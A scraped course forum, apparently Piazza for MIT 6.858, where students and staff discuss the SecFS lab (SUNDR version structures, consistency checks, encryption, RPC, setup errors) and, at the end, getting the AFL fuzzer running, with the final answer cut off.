<p>If you haven&#39;t started the project yet, you should consider starting soon, though. It&#39;s rather difficult to understand how the system works.</p></div>
<h2>Followup</h2>
<div><p>I also emailed <a href="mailto:6.858-staff&#64;pdos.csail.mit.edu">6.858-staff&#64;pdos.csail.mit.edu</a> but no one has answered.</p></div>
<h3>Followup Response</h3>
<div><p>They&#39;re probably busy, maybe wait a few days and ask them on Monday in person? In the meantime you can start reading the lab description, the SUNDR paper, the UNIX paper, the code files, etc.</p></div><hr><h1>Lab 5, Exercise 3</h1>
<h3>2018-05-04T19:39:02Z</h3>
<div><p>How does a user specify that a file is read protected? In the _create() function (in fs.py), how do we know if a user has enabled read restrictions?</p></div>
<h2>Student Answer</h2>
<div><p>search for &#34;encrypt&#34; in secfs-fuse</p></div><hr><h1>Ideas for Improvements</h1>
<h3>2018-05-04T15:10:31Z</h3>
<div><p>One of the deliverables in the lab handout is: &#34;At least one of the &#34;Ideas for improvements&#34; listed further down in this document, or some other nontrivial feature.&#34;</p>
<p></p>
<p>Is this an extra challenge, or a requirement to get full credit?</p></div>
<h2>Staff Answer</h2>
<div><p>It&#39;s a requirement not an optional or extra credit. </p>
<p></p>
<p>Sorry that I keep mentioning ideas for improvement as challenges; this may cause confusion with extra credit challenge in other labs. Let me fix my answers that I used the word &#34;challenge&#34; to avoid confusion.</p></div>
<h2>Student Answer</h2>
<div><p>&#64;536</p></div><hr><h1>Do we need to support user-writeable but group-readable files?</h1>
<h3>2018-05-04T08:44:30Z</h3>
<div><p>The lab 5 requirements doesn&#39;t seem to specify that we need to implement this ability (quote: &#34;users should be able to limit the read-permissions for that file in such a way that only those who can write the file can read it&#34;, but it didn&#39;t say users should be able to set it so exactly those in the group can read it). However, at the top of secfs-fuse, there is the line &#34;TODO: user-writeable, but group-readable&#34;.</p>
<p></p>
<p>And if we need to support user-writeable, group-readable files, what is the user input supposed to be? (I suppose we have to abuse umask, but what do we set the umask to be?)</p></div>
<h2>Followup</h2>
<div><p>bump?</p></div>
<h2>Staff Answer</h2>
<div><p>I think you don&#39;t need to worry too much about (user-writeable&#43;group-readable), the TODO is likely for the staff. </p>
<p></p>
<p>If you&#39;re curious, the umask for user-writeable, group-readable file might look like 0024. </p></div><hr><h1>Do we need to support writable-but-not-readable files?</h1>
<h3>2018-05-03T23:47:27Z</h3>
<div><p>In POSIX filesystems, files can have permissions like &#96;200&#96;, which allows writing to a file but not reading from it. This seems difficult to implement without a trusted server, because (for example) it would require the ability to write to an encrypted file at an arbitrary plaintext offset while maintaining the integrity of the file.</p>
<p></p>
<p>Do our filesystems need to support this mode?</p></div>
<h2>Staff Answer</h2>
<div><p>No you don&#39;t need to support that. If you want to, you can do that as a challenge :)</p></div><hr><h1>Late Hours Calculation?</h1>
<h3>2018-05-03T21:08:14Z</h3>
<div><p>Curious how late hours is calculated so I can see how much I have for Lab 5.</p>
<p></p>
<p>I have been late for parts of labs before, but they are not indicated on the submissions page. Is the late hours indicated on the submissions page accurate, or are there some hidden numbers there?</p></div>
<h2>Student Answer</h2>
<div><p>&#64;473</p></div>
<h2>Followup</h2>
<div><p>&#64;473 doesn&#39;t answer OP&#39;s question about how late hours for full/partial labs.</p></div><hr><h1>Check-off meeting</h1>
<h3>2018-05-03T21:03:07Z</h3>
<div><p>The &#34;Deliverables&#34; section of Lab 5 says:</p>
<p></p>
<p>&gt; The lab is graded based on the included design document, the check-off meeting with the TAs, the number of passed tests on the included test suite, as well as any additional features implemented beyond the requirements.</p>
<p></p>
<p>What are the logistics for the check-off meeting with the TAs? Do we need to set up a meeting?</p></div>
<h2>Followup</h2>
<div><p>bump</p></div>
<h3>Followup Response</h3>
<div><p>We will send out a form/schedule soon with more information about the checkoff meetings sometime this week. </p></div>
<h2>Student Answer</h2>
<div>resolved below</div><hr><h1>User tries to read encrypted file</h1>
<h3>2018-05-03T19:36:52Z</h3>
<div><p>If a user tries to read a file that is encrypted, which they aren&#39;t able to decrypt, what should we do? Can we just show them arbitrary binary data or is there a specific error that should be thrown?</p></div>
<h2>Staff Answer</h2>
<div><p>You can design your system whatever you think is reasonable when that part of the system is underspecified. I agree with throwing a PermissionError.</p></div><hr><h1>Splitting up team mate work</h1>
<h3>2018-05-03T17:08:21Z</h3>
<div><p>Do the exercises have to be done sequentially or can some be done in parallel?</p></div>
<h2>Staff Answer</h2>
<div><p>Ex1 and Ex2 overlap a lot. Ex3 is independent from others. </p>
<p>Peer coding is also a good idea for working on ex1-2 because it can be very error prone. <br /><br />In Ex1-2, after you all agree on structure of your VSL (ex. after making VS class or so), you may consider splitting work like this:</p>
<p></p>
<p>- update VSL<br />- load &amp; store VSL</p>
<p>- sign and verify VS<br />- consistency check</p>
<p>- support group table</p>
<p><br />Again, make sure that you all really understand what other will doing; otherwise it can be very confusing: making VS class or other structure before hand will help. Keep in mind that updating and loading are major part and can be very error prone.</p></div><hr><h1>server vs client</h1>
<h3>2018-05-03T14:53:25Z</h3>
<div><p>How do we store things in the server vs the client? Is everything in secfs/ the client? Are variables shared across clients, or do clients get their own version?</p>
<p></p>
<p>for example, in tables.py, if we store something</p>
<p></p>
<ul><li>in the &#34;server&#34; global variable, that should be stored in the SecFSRPC class in secfs-server right?</li><li>in another global variable, like current_itables, is that shared across clients?</li><li>how do we store anything specific to a particular client? there seems to be no way to reference the &#34;current client&#34;, how do we store the VS for the current client? or do we just never store it?</li></ul>
<p></p>
<p>If we can&#39;t store anything in the &#34;current client&#34; or even reference the &#34;current client&#34;, how do we know what user is using the current client, or store the VS? We need the VS and the current user in post() to send the updated VS to the server. If we store it as a global variable, won&#39;t that be extremely insecure since other clients can access it? How do we know what &#34;client&#34; we are?</p>
<p></p>
<p>What does it mean to push or pull VS&#39;s (or any other data) in this system? How do the client and server communicate? Do we just set variables in the &#34;server&#34; global variable in tables.py and count that as communication?</p></div>
<h2>Student Answer</h2>
<div><p>The *only* code running in the server is bin/secfs-server. Everything else is in the client. Clients and the server communicate across RPC. You can imagine the server code running in a separate machine, and each client its own machine. So local variables are not shared across clients. To communicate with the server, you need to add RPC methods similar to the ones already in secfs-server. If you just try to set a variable on the server, eg <tt>server.x = &#39;y&#39;</tt>, you&#39;ll get an error like &#34;RPC method &#39;x&#39; not defined&#34;. Hope that helps!</p>
<p></p></div>
<h2>Followup</h2>
<div><p>But what about global client state (shared across clients) vs individual client state (for a specific client)?</p></div>
<h3>Followup Response</h3>
<div><p>There is no global client state. Clients are on different computers running their own copy of the client software and don&#39;t communicate other than through the server. This is why initially a second client can&#39;t function properly--the itables are stored locally on the first client. It has to be persisted on the server for the second client to get it.</p>
<p></p>
<p>While coding, you can think of the client code referring to only one client and communicating with the server through RPC to get info about other clients (ie, through the VSL).</p></div>
<h3>Followup Response</h3>
<div><p>ah, so global variables in the client are only accessed by the given client?</p></div>
<h3>Followup Response</h3>
<div><p>Yup</p></div><hr><h1>General question about the order of tests</h1>
<h3>2018-05-03T14:14:17Z</h3>
<div><p>Are the tests in order of exercise? Aka if we pass exercise 0, we&#39;ll have passed all tests up to say, test 60. After exercise 1, we&#39;ll pass all tests up to test 70. So and so forth. Or are the tests randomly interspersed?</p></div>
<h2>Staff Answer</h2>
<div><p>The number of tests that you will pass with each exercise increases roughly in order, but not exactly. For example, you might notice that the permissions-related tests are interspersed. </p></div>
<h2>Followup</h2>
<div><p>It is possible that you get same or lower PASS percentage but you actually pass more test. </p></div>
<h3>Followup Response</h3>
<div><p>wait, what does that even mean?</p>
<p></p>
<p>how can you pass more tests but get a lower accuracy?</p></div>
<h3>Followup Response</h3>
<div><p>tests may halt early but the script will still output a percentage. so you can pass 3/4 tests before the code crashes and get 75%. In another case you could pass 65/100 tests, but only get 65%, despite your code for the second submission being much better.</p></div>
<h3>Followup Response</h3>
<div><p>yeah, i don&#39;t count those</p>
<p></p>
<p>if the test halts early then there&#39;s a serious bug, i just look at the number of tests passing not the percentage (in general number of tests passing is much better than percentage)</p>
<p></p>
<p>but i see your point</p></div><hr><h1>What is a principal?</h1>
<h3>2018-05-03T11:40:33Z</h3>
<div><p>According to types.py it&#39;s neither a user nor a group, but it&#39;s a parent class of both user and group. What are principals meant to represent?</p></div>
<h2>Staff Answer</h2>
<div><p>Principal is abstract class represents subject (user and group) that can do action and own some file as you can do in Linux file system. Rather than having Secfs-specific meaning, Blob has universal meaning: binary large object. If you want to know what it&#39;s look like you can print from other function that already pass blob object. For conversion, check a given code and look for function that pass argument to blob param. <br /><br />The format is a bit tricky. I highly recommend you observe it from printing statement as I suggested above.</p></div><hr><h1>How to sign with private key</h1>
<h3>2018-05-03T06:03:38Z</h3>
<div><p>My group is having some issues with figuring out how to call the cryptographic methods to sign.  How do we access the user&#39;s private key?  Additionally, when we tried with a randomly generated key (rsa.generate_private_key) for proof of concept, we got &#34;ValueError: Fernet key must be 32 url-safe base64-encoded bytes.&#34;  How do we encode the key correctly to call encrypt_sym on our data?</p></div>
<h2>Staff Answer</h2>
<div><p>Access private key: Take a look at register_keyfile() has already done some job for you. See how can you get user&#39;s private key after that. <br />Fernet key is for symmetric key encryption (a single key to perform both encrypt and decrypt, while RSA is asymmetric key encryption where you use public key to encrypt and private key to decrypt. Therefore if you want to use RSA to encrypt/decrypt, you will need to follow method of RSA. <br /><br />This page might help you understand better https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/</p></div><hr><h1>storing VSLs on server</h1>
<h3>2018-05-03T00:42:48Z</h3>
<div><p>From the lab part 1, the problem is that a second client can&#39;t access the first client&#39;s current_itables.</p>
<p>To solve that when using VSLs, the second client would just download the first client&#39;s VSL, which has to be stored somewhere on the server. We were thinking of saving the VSL in a pickle file in the root directory of Secfs. But we&#39;re confused about whether or not we should encrypt the VSL when storing it on the server. It seems like the VSL is signed, but then how do other clients read the different version structure&#39;s version vector and check for consistency?</p></div>
<h2>Staff Answer</h2>
<div><p>No need to encrypt the version structure list. Based on the requirement in handout,  &#34;you will need to encrypt files&#34;. <br />However, you might consider doing metadata encryption similar to this one listed as a part of the challenge</p>
<ul><li>The inodes themselves are not currently encrypted, even though the inode&#39;s block contents are. Implementing this is non-trivial, but could be a fun challenge.</li></ul></div><hr><h1>Running ./setup.sh gives error</h1>
<h3>2018-05-03T00:41:57Z</h3>
<div><p>I ran ./setup.sh and I got the following stack trace: </p>
<p></p>
<pre>Collecting wheel
  Downloading https://files.pythonhosted.org/packages/1b/d2/22cde5ea9af055f81814f9f2545f5ed8a053eb749c08d186b369959189a8/wheel-0.31.0-py2.py3-none-any.whl (41kB)
    100% |████████████████████████████████| 51kB 3.1MB/s 
Installing collected packages: wheel
Successfully installed wheel-0.31.0
You are using pip version 9.0.3, however version 10.0.1 is available.
You should consider upgrading via the &#39;pip install --upgrade pip&#39; command.
Obtaining file:///Users/cadlab2015/Documents/6.858/secfs
Collecting llfuse (from SecFS==0.1.0)
  Downloading https://files.pythonhosted.org/packages/fc/9f/074ba23d32b961cb4b43c22c70d49f2db2484f7b60777897a87726e2648f/llfuse-1.3.4.tar.bz2 (364kB)
    100% |████████████████████████████████| 368kB 2.5MB/s 
    Complete output from command python setup.py egg_info:
    Traceback (most recent call last):
      File &#34;&lt;string&gt;&#34;, line 1, in &lt;module&gt;
      File &#34;/private/var/folders/l1/gn7369251jq0xxyr58698bl00000gn/T/pip-build-m_r7__ad/llfuse/setup.py&#34;, line 283, in &lt;module&gt;
        main()
      File &#34;/private/var/folders/l1/gn7369251jq0xxyr58698bl00000gn/T/pip-build-m_r7__ad/llfuse/setup.py&#34;, line 76, in main
        compile_args = pkg_config(&#39;fuse&#39;, cflags=True, ldflags=False, min_ver=&#39;2.8.0&#39;)
      File &#34;/private/var/folders/l1/gn7369251jq0xxyr58698bl00000gn/T/pip-build-m_r7__ad/llfuse/setup.py&#34;, line 175, in pkg_config
        if subprocess.call(cmd) != 0:
      File &#34;/usr/local/Cellar/python/3.6.5/Frameworks/Python.framework/Versions/3.6/lib/python3.6/subprocess.py&#34;, line 267, in call
        with Popen(*popenargs, **kwargs) as p:
      File &#34;/usr/local/Cellar/python/3.6.5/Frameworks/Python.framework/Versions/3.6/lib/python3.6/subprocess.py&#34;, line 709, in __init__
        restore_signals, start_new_session)
      File &#34;/usr/local/Cellar/python/3.6.5/Frameworks/Python.framework/Versions/3.6/lib/python3.6/subprocess.py&#34;, line 1344, in _execute_child
        raise child_exception_type(errno_num, err_msg, err_filename)
    <strong>FileNotFoundError: [Errno 2] No such file or directory: &#39;pkg-config&#39;: &#39;pkg-config&#39;</strong>
    
    ----------------------------------------
<strong>Command &#34;python setup.py egg_info&#34; failed with error code 1 in /private/var/folders/l1/gn7369251jq0xxyr58698bl00000gn/T/pip-build-m_r7__ad/llfuse/</strong>
You are using pip version 9.0.3, however version 10.0.1 is available.
You should consider upgrading via the &#39;pip install --upgrade pip&#39; command.</pre>
<p></p>
<p>Running ./start.sh gives something similar - should I be getting these errors? </p></div>
<h2>Staff Answer</h2>
<div><p>You shouldn&#39;t get that error. Did you run everything inside the 6858 VM?</p></div>
<h2>Followup</h2>
<div><p>No I didn&#39;t - thanks, that fixed it!</p></div>
<h2>Student Answer</h2>
<div><p>&#64;571</p></div><hr><h1>Same key to sign a decrypt?</h1>
<h3>2018-05-03T00:14:43Z</h3>
<div><p>My group is finding it simpler to use the same RSA key pair to do signing and verification as well as encryption and decryption. Is this ok?</p></div>
<h2>Staff Answer</h2>
<div><p>The main issue about public encryption is about its performance. You should consider using symmetric key encryption instead. </p>
<p></p>
<p>However, if you mean to encrypt very small portion not the actual data itself, I agree that you can use the same key for simplicity :)</p></div><hr><h1>Consistency Check</h1>
<h3>2018-05-02T22:10:34Z</h3>
<div><p>We are a little confused on how to perform the consistency check.</p>
<p></p>
<p>1) To construct the version vector, do we go back to the last version vector of the same user and build up from there? But that misses any new users/groups that were created in between. Should we instead be using the last version structure in the list (no matter who the user is)?</p>
<p></p>
<p>2) How do we find the prev version vector of the same user? If we search through the list and don&#39;t find an entry, we can&#39;t just assume its a new user right? Do we maintain some state for the user&#39;s previous version vector and ensure that all changes have been incremental (in terms of version numbers) since?</p>
<p></p>
<p>3) Do we check consistency only in terms of adjacent entries (making sure the later one is indeed later) in the version structure starting from the previous vector of the same user? Or do we have to do everything from eternity? Or everything relative to the new version structure entry?</p></div>
<h2>Staff Answer</h2>
<div><p>1. You will need the most recent version numbers of all users in order to construct the new valid version structure.You are correct that if you only check the latest version of only one specific user say &#34;userA&#34;, you might endup having outdated version# of &#34;userB&#34;. Think about how can you tackle this problem and get all recent version#.<br /><br />2. Yes new user. Only most recent version of each user is sufficient. No need to keep all history of single user. If you concern about validation check (incremental), think about whether your constraint preserve over time, i.e. do you really need to compare against all vs of same user in the past.<br /><br />3. Similar to answer in 2, if that make sense :)</p></div>
<h2>Followup</h2>
<div><p>How do we store anything in the client? How do we get the most recent version numbers of all users? Are all VSLs stored in the server? Is anything stored in the client?</p></div><hr><h1>tree add name?</h1>
<h3>2018-05-02T22:02:33Z</h3>
<div><p>When we use names in secfs, are those fully-qualified path names (starting from the root), or are those relative to parent directory?</p></div>
<h2>Followup</h2>
<div><p>I&#39;m not quite sure where you are referring to here, but if you are asking about names that are passed to secfs, you could print it out (the output will be in client.log or primaryclient.log</p></div>
<h2>Student Answer</h2>
<div>resolved below</div><hr><h1>b&#34;Why is there a b in front of Python strings in the code?&#34;</h1>
<h3>2018-05-02T21:30:23Z</h3>
<div><p>b is for byte string</p>
<p></p>
<p>Why do we need byte strings instead of regular strings? Is that a limitation of SUNDR?</p></div>
<h2>Staff Answer</h2>
<div><p>Not limitation. You can convert between bytes and ascii string. bytes can cover even more result than string. <br />One of the reason why byte is used here is that most time socket receive and send data as bytes. That&#39;s why you do conversion when client communicate with the server.</p></div><hr><h1>Failing Permission Tests</h1>
<h3>2018-05-02T21:19:19Z</h3>
<div><p>We are failing a series of permission tests. Do we have to do anything for umask support? Or is the error somewhere in our group ihandle/itable implementations?</p></div>
<h2>Student Answer</h2>
<div><p>I think if you run &#34;sudo ./test.sh&#34;, you&#39;ll fail the permission tests because even the commands meant to be run as a normal user run as root.</p></div><hr><h1>Second client without last operation?</h1>
<h3>2018-05-02T21:13:41Z</h3>
<div><p>Exercise 1 seems to imply that there can be multiple clients for one user; however, from SUNDR paper, to move from clients, one has to remember the last operation performed. What am I missing?</p></div>
<h2>Followup</h2>
<div><p>I also have this question. The lab says &#34;Multiple concurrent users, all connected to the server through <em>different</em> clients, should be able to share files with one another. &#34; Does that mean that, for example, user httpd could potentially connect through two different clients, or is each user limited to one  client?</p></div>
<h3>Followup Response</h3>
<div><p>I think it would be a user could connect with different clients </p></div>
<h2>Staff Answer</h2>
<div><p>I think that is taken care of by the version number:<br /><br /></p>
<div>
<div>
<div>
<div>
<pre> To move between clients, a user needs both his or her private key and the last operation performed on his or her behalf (concisely specified by a version number). </pre>
</div>
</div>
</div>
</div>
<p></p></div>
<h2>Followup</h2>
<div><p>I understand that this second client will need a version number to specify its last operation. But SecFS doesn&#39;t provide any mechanism for transfering this version number between clients.</p>
<p></p>
<p>For example if I launch client 1 with httpd and perform some operation; I can still launch client 2, at which point client 2 had no prior info of what client 1 had done with the identity &#34;httpd&#34;. </p></div><hr><h1>How do we save the i-tables/VSL to the server?</h1>
<h3>2018-05-02T19:49:21Z</h3>
<div><p>We&#39;re unsure how we should save the i-tables/VSL to the server. Do we need to create a new instance variable in the SecFSRPC() class and add getter and setter methods for it? If someone could point us in the right direction that would be awesome :).</p></div>
<h2>Staff Answer</h2>
<div><p>Check the secfs-server that is run by server and think about this line.<br />&#34;NOTE: All your server state *must* go here.&#34;<br />I&#39;m sure you will get it :)</p></div><hr><h1>OSError (Address already in use) while running ./start.sh</h1>
<h3>2018-05-02T15:11:41Z</h3>
<div><p>I&#39;m ssh&#39;d into my course VM (VMware fusion). I&#39;ve succesfully run ./setup.sh within the secfs directory. I execute ./start.sh and I get an OSError: Address already in use. See below for full error transcript. Any idea how to fix this? I haven&#39;t modified any files within the repository and it&#39;s a fresh pull from the skeleton repo.</p>
<p></p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/hlmw7ncksqb1mz/jgp8olcvhaxe/Screen_Shot_20180502_at_11.10.56_AM.png" alt="" /></p></div>
<h2>Student Answer</h2>
<div><p>see solution above</p></div><hr><h1>Sending partial VSL</h1>
<h3>2018-05-02T10:11:30Z</h3>
<div><p>Seems like piazza had some bug that caused my previous question to fail. </p>
<p></p>
<p>In section 3.3.2 of SUNDR paper:</p>
<p></p>
<p>1) </p>
<div>
<div>
<div>
<div>
<p><tt>(Much of the VSL’s transfer can be elided if only a few users and groups have changed version structures since the user’s last operation.</tt></p>
</div>
</div>
</div>
</div>
<p>2)</p>
<div>
<div>
<div>
<div>
<p><tt>To check consistency, the client verifies that the VSL contains u’s previous version structure</tt></p>
<p><tt></tt></p>
<p>If by 1) the protocol omit transferring the common old prefix, isn&#39;t that we can omit 2) ?</p>
</div>
</div>
</div>
</div></div>
<h2>Followup</h2>
<div>Sending partial VSL
<p>In section 3.3.2 of the SUNDR paper, it says:</p>
<p></p>
<p>1.</p>
<div>
<div>
<div>
<div>
<p><tt>(Much of the VSL’s transfer can be elided if only a few users and groups have changed version structures since the user’s last operation.) </tt></p>
<p></p>
<p>2.</p>
<div>
<div>
<div>
<div>
<p><tt>To check consistency, the client verifies that the VSL contains u’s previous version structure</tt></p>
<p><tt></tt></p>
<p>1 and 2 together seems odd to me: if we omit transferring any VS old entries using 1), aren&#39;t the old entries assumed to be the prefix of VSL, so already achieving the purpose of 2) ?</p>
<p></p>
<p></p>
<p></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div></div>
<h2>Staff Answer</h2>
<div><p>If I understand the meanings correctly, I don&#39;t think so. Even though you only update partially, you still need to verify whether those version numbers are not less than those shown in version vectors of all users or not.<br /><br />Suppose you only update userA-version# from 3 to 4, you will need to check that userB_signed_versionVector[userA] &lt; 4 and  userC_signed_versionVector[userA] &lt; 4 right?</p></div>
<h2>Followup</h2>
<div><p>&#64;Cattalyya, but since before the partial update, the list already satisfies total order, if only A is updated from 3 -&gt; 4, then it must be &gt;= all entries that are already in the list.</p>
<p></p>
<p>To clarify, I imagined the protocal to be like the following:</p>
<p></p>
<p>1. Client keeps VSL [v0 &lt;= v1 &lt;= v2 ... &lt;= vn] </p>
<p>2. Client asks server new entries after the version (vn.user, vn[vn.user])</p>
<p>3. Server response postfix sublist [v_{n&#43;1} &lt;= ... v_{m}], client verifies that this sublist is total ordered(and check signature)</p>
<p>4. Client checks v_n &lt;= v_{n&#43;1}</p>
<p>5. Concat sublist to end: [v0 &lt;= v1 &lt;= v2 ... &lt;= v_n ... &lt;= v_m] --- this list must already be totally ordered </p>
<p>6. Create entry &#34;z&#34; as proposed in the paper, append to list and check v_m &lt;= z</p>
<p>7. sign and commit z to server </p>
<p>8. Optionally prune VSL&#39;s old entries from v_0 to v_n that are retired by the sublist [v_{n&#43;1} .. v_{m}]. This way the client always keeps track of VSL of length at max the total number of users(which makes it different from the strawman FS)</p>
<p></p>
<p></p></div><hr><h1>What to do when an inconsistency is detected?</h1>
<h3>2018-05-02T00:02:35Z</h3>
<div><p>What happens if an inconsistency is detected?</p>
<p></p>
<p>In the &#34;straw-man file system&#34;, after an attack, two users end up with forked filesystem history chains?</p>
<p></p>
<p>Is that what we should do, have two separate forks after an attack? How would we implement that with version structures, maybe by identifying which version structure is preventing the list from being &#34;totally ordered&#34; and excluding that structure in the test from that point on?</p></div>
<h2>Staff Answer</h2>
<div><p>It should be fine to just throw an error when you detect an attack. </p></div><hr><h1>Meaning of &#34;totally ordered&#34;.</h1>
<h3>2018-05-01T23:50:03Z</h3>
<div><p>SUNDR section 3.3.2 says: To check consistency,</p>
<p>1) the client verifies that the VSL contains u’s previous version structure,</p>
<p>2) and that the set of all VSL entries combined with z is totally ordered by ≤.</p>
<p></p>
<p>What does the paper mean by totally ordered? Does it mean that the client should check every single version structure and ensure that it is possible to sort all structures by its definition of less than or equal to?</p></div>
<h2>Student Answer</h2>
<div><p><a href="http://mathworld.wolfram.com/TotallyOrderedSet.html">http://mathworld.wolfram.com/TotallyOrderedSet.html</a></p>
<p></p>
<p>It&#39;s a math concept.</p>
<p></p>
<p>A set is totally ordered when any two elements are comparable.</p></div><hr><h1>Do we need a group ihandle in the version structure?</h1>
<h3>2018-05-01T15:11:16Z</h3>
<div><p></p><p style="text-align:left">Our group spent a lot of time discussing the serialized protocol, and we were wondering: Is it necessary to have group ihandles in a user&#39;s version structure? The paper makes it seem optional, but then why include it at all? It seems redundant to have this information in a user&#39;s version structure, assuming each group also has its own version structure which is what the authors of the paper imply. When might we want to include that information in the user&#39;s version structure?</p>
<p style="text-align:left"></p>
<p style="text-align:left">From the paper: &#34;Each version structure is signed by a particular user. The structure must always contain the user’s i-handle. In addition, it can optionally contain one or more i-handles of groups to which the user belongs.&#34;</p>
<p style="text-align:left"></p></div>
<h2>Student Answer</h2>
<div><p>From &#64;607, it seems groups don&#39;t have their own version structures</p></div>
<h2>Staff Answer</h2>
<div><p>Groups technically don&#39;t have version structures, but the user VSes do contain entries for groups when a group entry is changed. One way to think about it: one of the purposes of recording the ihandles is that the user is going to sign off on the version structure saying that this is latest state that the user has seen of the parts of the filesystem that the user could modify.</p>
<p></p>
<p>Hmm, I read that sentence as meaning that the VS might not have any group ihandles if the user didn&#39;t belong to any groups or there are no changes that are related to any group that the user is a part of. </p></div>
<h2>Followup</h2>
<div><p>Say $$u_1$$ and $$u_2$$ both belong to $$g_1$$ and $$g_2$$. <br />Now, $$u_1$$ makes an update to $$g_1$$&#39;s itable and $$u_2$$ makes an update to $$g_1$$&#39;s itable.<br /><br />Then if the VSL only has entry for $$u_1$$ and an entry for $$u_2$$, then we lose $$g_2$$&#39;s ihandle?<br /><br />I can think of two ways to mitigate this: <br />- in each user&#39;s VS, store the ihandles of all the groups he belongs to<br />- or, have the VSL store all the VS that have ever been pushed<br /><br />They both seem suboptimal to me?</p>
<p></p></div>
<h3>Followup Response</h3>
<div><p>Another option is that each user include the group ihandle if it was the last user to change that group&#39;s ihandle?</p></div>
<h3>Followup Response</h3>
<div><p>This could be a design consideration (and if so, you should include a short explanation for your choice in the write-up). </p>
<p></p>
<p>If I understand correctly, in your example $$g_2$$ is not modified at all, and so we do not have an itable or ihandle for $$g_2$$ yet? If so, the VS for $$u_1$$ would only have $$g_1$$&#39;s ihandle, which is fine since we don&#39;t have ihandle for $$g_2$$. When $$u_2$$ wants to make its update to $$g_1$$, it would have to download the latest VSL, make its update to $$g_1$$ and update its own VS.</p>
<p></p>
<p>If the example was that $$u_1$$ edited $$g_1$$ and $$u_2$$ edited $$g_2$$: Remember that SecFS must also achieve fork consistency. Think about the user&#39;s VS as saying the user is announcing that this is the latest version of the file system I&#39;ve seen (since the ihandle includes information of a part of the file system at that point in time). I think that both your options would work well, but one of them seems to be better to me. (Again, this is just my opinion)</p>
<p></p>
<p>Does this answer your question? </p></div>
<h3>Followup Response</h3>
<div><p>Sorry, my question was confusing.</p>
<p></p>
<p>Say the VSL contains an entry for $$u_1$$ with $$g_1$$&#39;s previous handle and an entry for $$u_2$$ with $$g_2$$&#39;s handle.</p>
<p>If $$u_2$$ now makes an update to $$g_1$$ but not $$g_2$$, it also has to push the old handle for $$g_2$$ even though it has not modified it. Otherwise, the handle is lost.</p></div>
<h3>Followup Response</h3>
<div><p>Yes, you are right, $$u_2$$ would have to push the handle for $$g_2$$ (and also $$g_1$$), otherwise as you said it would be lost, and I think it would then be possible for a malicious server to launch an attack. </p></div>
<h2>Followup</h2>
<div><p>Sorry I don&#39;t understand what you mean by &#34;groups technically don&#39;t have version structures&#34;. </p>
<p></p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/ik4smxhhrgr50o/jgyk5bua7zkg/piazzaq.PNG" alt="" /></p>
<p>It says that the VSL has the latest VS for each user and group. So in the VSL, can you only find group version information by looking through the version vectors of user VS?</p></div><hr><h1>Are there office hours now?</h1>
<h3>2018-05-01T13:25:10Z</h3>
<div>Hi, are there office hours now? <div><br /></div></div>
<h2>Staff Answer</h2>
<div><p>They were rescheduled. &#64;610</p></div><hr><h1>Can we add parameters to pre and post?</h1>
<h3>2018-04-30T22:21:26Z</h3>
<div><p>For the final project, can we change the function definitions/add parameters for pre and post in tables.py?</p></div>
<h2>Staff Answer</h2>
<div><p>I think the only things that we aren&#39;t allowed to change are the tests in test.sh, and the places in bin/secfs-fuse that are marked as &#34;do not change this function / this code&#34;. </p>
<p> </p>
<p>pre() and post() are called by _pre() and _post() in bin/secfs-fuse, which in turn are called throughout bin/secfs-fuse including the init() marked as &#34;do not change&#34;. So, if you&#39;re changing pre() and post(), but not the function definition of _pre() and _post() it should be fine. </p>
<p></p>
<p>Just curious, why do you want to change pre() and post()? (Feel free to follow up in a private post if it is too much detail) </p></div>
<h2>Followup</h2>
<div><p>We needed the user who is making file system changes in the post function (its currently only available in pre). Is there any other way we can make this accessible? </p></div>
<h3>Followup Response</h3>
<div><p>You&#39;re right that you have the information in pre, can you think of a way to save it when you receive the information in pre or maybe tie that information to a data structure such that you can access that information in post without changing the function definition?</p></div>
<h3>Followup Response</h3>
<div><p>Since the call to pre gets the lock, we can assume no other user might call post after one user calls a pre() right? Then a global variable or any other means of preserving it should work fine.</p></div>
<h3>Followup Response</h3>
<div><p>That sounds fine to me (but do be careful in using global variables) :). However, if you decide to implement concurrent SUNDR as your improvement, this might be something that you&#39;ll have to change. </p></div><hr><h1>Tuesday 5/1 9am office hours rescheduled to Friday 5/4 9am</h1>
<h3>2018-04-30T13:07:04Z</h3>
<div><p></p></div>
<h2>Followup</h2>
<div><p>Are these still happening?</p></div>
<h3>Followup Response</h3>
<div><p></p><div>
  Yup. On my way. 
</div></div><hr><h1>No instrumentation detected</h1>
<h3>2018-04-30T00:41:39Z</h3>
<div><p>I&#39;m trying to use afl. I&#39;m getting an error: no instrumentation detected. I believe AFL needs me to re compile the program using some custom addition of theirs to the C/C&#43;&#43; compiler, however I don&#39;t have access to the original source. How can I proceed?</p></div>
<h2>Student Answer</h2>
<div><p>You can use qemu or blind mode to fuzz un-instrumented code. The readme describes these options in more detail.</p></div><hr><h1>Fuzzing using afl</h1>
<h3>2018-04-29T23:43:18Z</h3>
<div><p>I&#39;ve been trying to set up afl so I can do tonights reading question. I&#39;m trying to do the qemu setup for binary files but I keep getting these errors:</p>
<p></p>
<p><b>httpd&#64;vm-6858</b>:<b>~/for_6_858/afl-2.52b/qemu_mode</b>$ sudo apt install libtool</p>
<p>[sudo] password for httpd: </p>
<p>Reading package lists... Done</p>
<p>Building dependency tree       </p>
<p>Reading state information... Done</p>
<p>libtool is already the newest version (2.4.6-0.1).</p>
<p>The following package was automatically installed and is no longer required:</p>
<p>  grub-pc-bin</p>
<p>Use &#39;sudo apt autoremove&#39; to remove it.</p>
<p>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</p>
<p><b>httpd&#64;vm-6858</b>:<b>~/for_6_858/afl-2.52b/qemu_mode</b>$ ./build_qemu_support.sh</p>
<p>=================================================</p>
<p>AFL binary-only instrumentation QEMU build script</p>
<p>=================================================</p>
<p></p>
<p>[*] Performing basic sanity checks...</p>
<p>[-] Error: &#39;libtool&#39; not found, please install first.</p>
<p><b>httpd&#64;vm-6858</b>:<b>~/for_6_858/afl-2.52b/qemu_mode</b>$</p>
<p></p>
<p>It looks like lib tool is installed but then I get an error that it isn&#39;t. Has anyone been able to successfully set up afl for this question? If so, could you tell me which commands you used and where? </p></div>
<h2>Followup</h2>
<div><p>Also, I have let the AFL fuzzer run for 40 hours, and it has not found any bugs... suggestions?</p></div>
<h2>Student Answer</h2>
